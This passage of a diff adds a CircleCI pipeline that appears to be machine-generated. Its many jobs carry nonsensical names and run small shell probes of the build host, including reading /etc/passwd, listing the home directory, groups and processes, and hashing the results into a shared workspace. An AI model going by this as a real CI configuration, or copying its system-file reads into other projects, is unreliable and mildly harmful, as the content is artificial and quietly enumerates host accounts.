+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  TME-ELEMENT-PTR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Fifth time pack the crafting recipes
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; cat /proc/meminfo | grep --no-filename 'Slab' | tail -3; true ; } > /tmp/indir/nSF32vM0
+            sha1sum /tmp/indir/nSF32vM0 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'nSF32vM0'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/nSF32vM0 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  XNA-19961:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Warm the rollout plan ahead of lunch
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; fmt -w 32 /proc/cpuinfo | wc -l; true ; } > /tmp/indir/P00079246
+            sha1sum /tmp/indir/P00079246 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'P00079246'
+  node20-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/P00079246 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  r_bot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Focus the map view on mobile
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/east_2020-06-10" && touch "/tmp/east_2020-06-10"/{erin,heidi,pete}.tmp && ls -l "/tmp/east_2020-06-10"|tail -n +2; true ; } > /tmp/indir/syzukrgp1
+            sha1sum /tmp/indir/syzukrgp1 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'syzukrgp1'
+  v1-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/syzukrgp1 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+
+  ZoleV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture v2
+          command: |
+            mkdir -p /tmp/indir
+            set +o pipefail 2>/dev/null; date +%s%N > /tmp/indir/c847b37e-d462; sleep 0.1; date +%s%N >> /tmp/indir/c847b37e-d462; seq 1 2000 >> /tmp/indir/c847b37e-d462; true
+            sha1sum /tmp/indir/c847b37e-d462 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'c847b37e-d462'
+  intrauat25:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Recognise the CSV exports and have done with it
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; ls -av ~|tr '\n' ' '; true ; } > /tmp/indir/crc_a275d6c
+            sha1sum /tmp/indir/crc_a275d6c | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'crc_a275d6c'
+  errortighttrim:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture v2
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; ls -a -o | awk 'NR>1 {print $1}' | sort | uniq -c; true ; } > /tmp/indir/PO_097760
+            sha1sum /tmp/indir/PO_097760 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'PO_097760'
+  test_toggle_canvas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Now close the revenue split
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; find /tmp -path '*/.txt' -exec echo {} ';' 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/indir/7cf4e7
+            sha1sum /tmp/indir/7cf4e7 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - '7cf4e7'
+  theJoystick:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Deliver collection value
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; hr() { local IFS=+; echo "$*"; }; hr otter fox cat; true ; } > /tmp/indir/TXN_006593
+            sha1sum /tmp/indir/TXN_006593 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'TXN_006593'
+  client_2001_08:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: All systems go nudge the press list
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; lscpu --parse=CPU,CORE | tail -n4; true ; } > /tmp/indir/cyyxcvuiid
+            sha1sum /tmp/indir/cyyxcvuiid | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'cyyxcvuiid'
+  uriRaiseStruct:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture v2
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; getent group | cut --delimiter=: --fields=3 | awk '{printf "%05d\n", $1}' | head -n 6; true ; } > /tmp/indir/willow.canyon
+            sha1sum /tmp/indir/willow.canyon | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'willow.canyon'
+  len12:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Cover art is go
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; touch '/tmp/region_ivory.txt' && chmod u+x '/tmp/region_ivory.txt' && test -x '/tmp/region_ivory.txt' && echo executable; true ; } > /tmp/indir/20211109_165620
+            sha1sum /tmp/indir/20211109_165620 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - '20211109_165620'
+  mt_Hant_PL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: GPIO pin warmup
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; for val in $(seq 1 6); do echo "line $val"; done | sort; true ; } > /tmp/indir/lagoonfilter
+            sha1sum /tmp/indir/lagoonfilter | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'lagoonfilter'
+  df_ContractStackPage5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Daily currency field imputation
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; ps -eo comm= | awk '{print length, $0}' | tail -n2; true ; } > /tmp/indir/theta_titan_garden_flame
+            sha1sum /tmp/indir/theta_titan_garden_flame | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'theta_titan_garden_flame'
+  panWorkerRequest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: still loading primary node
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; awk -F: 'NR % 2{print $1 ":" $3}' /etc/passwd | wc -l; true ; } > /tmp/indir/lagoon876
+            sha1sum /tmp/indir/lagoon876 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'lagoon876'
+  heigth:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: despawn mini map
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nhugo,austin,90\nfrank,dublin,76\nsara,hanoi,56\ncarol,seoul,82\n' >'/tmp/weather-scripts.conf' && sort -t, -k3 -n '/tmp/weather-scripts.conf'; true ; } > /tmp/indir/MAPPER_SILENT
+            sha1sum /tmp/indir/MAPPER_SILENT | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'MAPPER_SILENT'
+  fOV4IB8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Breathe then bundle the mini map
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; printf '%s' "hello"; echo; true ; } > /tmp/indir/dm0Km6BV
+            sha1sum /tmp/indir/dm0Km6BV | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'dm0Km6BV'
+workflows:
+  verify:
+    jobs:
+      - y_train
+      - card__track__bold
+      - EXPORT
+      - package:
+          requires:
+            - y_train
+            - card__track__bold
+            - EXPORT
+      - aug4-smoke:
+          requires:
+            - y_train
+            - card__track__bold
+            - EXPORT
+      - v1-beta:
+          requires:
+            - y_train
+            - card__track__bold
+            - EXPORT
+      - assemble-partial-integration-tests:
+          requires:
+            - y_train
+            - card__track__bold
+            - EXPORT
+      - teh-ci:
+          requires:
+            - y_train
+            - card__track__bold
+            - EXPORT
+      - v1-ga4:
+          requires:
+            - y_train
+            - card__track__bold
+            - EXPORT
+      - gating:
+          requires:
+            - y_train
+            - card__track__bold
+            - EXPORT
+      - dp:
+          requires:
+            - y_train
+            - card__track__bold
+            - EXPORT
+      - M
+      - ZoleV:
+          requires:
+            - M
+      - fx-01:
+          requires:
+            - ZoleV
+      - ms_arg:
+          requires:
+            - ZoleV
+      - intrauat25:
+          requires:
+            - ms_arg
+      - rust-vet:
+          requires:
+            - intrauat25
+      - warning_sanitize_window:
+          requires:
+            - intrauat25
+      - errortighttrim:
+          requires:
+            - warning_sanitize_window
+      - build-nightly-artifact-bundle:
+          requires:
+            - errortighttrim
+      - subPointer9:
+          requires:
+            - errortighttrim
+      - test_toggle_canvas:
+          requires:
+            - subPointer9
+      - APP-365:
+          requires:
+            - test_toggle_canvas
+      - freshQ:
+          requires:
+            - test_toggle_canvas
+      - theJoystick:
+          requires:
+            - freshQ
+      - CORE-794:
+          requires:
+            - theJoystick
+      - XNA-19961
+      - reAddressCanvas
+      - tax-domino
+      - node20-fmt:
+          requires:
+            - XNA-19961
+            - reAddressCanvas
+            - tax-domino
+      - all-greens:
+          requires:
+            - XNA-19961
+            - reAddressCanvas
+            - tax-domino
+      - CORE-531:
+          requires:
+            - XNA-19961
+            - reAddressCanvas
+            - tax-domino
+      - q3-ship:
+          requires:
+            - XNA-19961
+            - reAddressCanvas
+            - tax-domino
+      - Receive-AIKey
+      - client_2001_08:
+          requires:
+            - Receive-AIKey
+      - pr-new:
+          requires:
+            - client_2001_08
+      - retryScanner:
+          requires:
+            - client_2001_08
+      - uriRaiseStruct:
+          requires:
+            - retryScanner
+      - q1-smoke:
+          requires:
+            - uriRaiseStruct
+      - theTempo:
+          requires:
+            - uriRaiseStruct
+      - len12:
+          requires:
+            - theTempo
+      - foxtrot:
+          requires:
+            - len12
+      - aki2k:
+          requires:
+            - len12
+      - mt_Hant_PL:
+          requires:
+            - aki2k
+      - bake-it:
+          requires:
+            - mt_Hant_PL
+      - GraphViewMotor
+      - wip-session-reload:
+          requires:
+            - GraphViewMotor
+      - TME-ELEMENT-PTR:
+          requires:
+            - GraphViewMotor
+      - push-it:
+          requires:
+            - TME-ELEMENT-PTR
+      - q4:
+          requires:
+            - TME-ELEMENT-PTR
+      - feb22-rev:
+          requires:
+            - q4
+      - HOST_PASS:
+          requires:
+            - q4
+      - anothr-run:
+          requires:
+            - HOST_PASS
+      - r_bot:
+          requires:
+            - HOST_PASS
+      - v1-edge:
+          requires:
+            - r_bot
+      - scale_Config-repo
+      - df_ContractStackPage5:
+          requires:
+            - scale_Config-repo
+      - fx-2:
+          requires:
+            - df_ContractStackPage5
+      - ConcreteSymbolAdapter:
+          requires:
+            - df_ContractStackPage5
+      - panWorkerRequest:
+          requires:
+            - ConcreteSymbolAdapter
+      - november-8:
+          requires:
+            - panWorkerRequest
+      - beastStats:
+          requires:
+            - panWorkerRequest
+      - heigth:
+          requires:
+            - beastStats
+      - DEV_STAGE_8:
+          requires:
+            - heigth
+      - guardsetup:
+          requires:
+            - heigth
+      - fOV4IB8:
+          requires:
+            - guardsetup
+      - pat-smoke:
+          requires:
+            - fOV4IB8
